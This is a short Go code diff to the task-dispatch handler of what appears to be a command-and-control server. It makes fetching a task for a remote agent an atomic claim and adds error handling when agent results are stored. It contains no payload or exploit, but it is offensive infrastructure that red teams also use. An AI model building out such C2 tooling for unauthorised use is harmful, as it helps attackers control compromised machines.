@@ -80,14 +80,13 @@ func (s *Server) handleExtC2(w http.ResponseWriter, r *http.Request) {
 			return
 		}
 		s.db.TouchAgent(agentID)
-		tasks, err := s.db.PendingTasks(agentID)
+		tasks, err := s.db.ClaimPendingTasks(agentID, 1)
 		if err != nil || len(tasks) == 0 {
 			w.WriteHeader(http.StatusNoContent)
 			return
 		}
 		// Return first pending task as plain JSON (no encryption — channel is responsible)
 		t := tasks[0]
-		s.db.MarkTaskFetched(t.ID)
 		w.Header().Set("Content-Type", "application/json")
 		json.NewEncoder(w).Encode(map[string]any{
 			"id":   t.ID,
@@ -110,7 +109,10 @@ func (s *Server) handleExtC2(w http.ResponseWriter, r *http.Request) {
 			http.Error(w, "bad json", http.StatusBadRequest)
 			return
 		}
-		s.db.InsertResult(req.TaskID, agentID, req.Output, req.Error)
+		if err := s.db.InsertResult(req.TaskID, agentID, req.Output, req.Error); err != nil {
+			http.Error(w, "result rejected", http.StatusBadRequest)
+			return
+		}
 		w.WriteHeader(http.StatusOK)
 		if req.Output != "" {
 			BroadcastGUI("TASK_RESULT", agentID, fmt.Sprintf("task #%d complete (ext-c2)", req.TaskID))
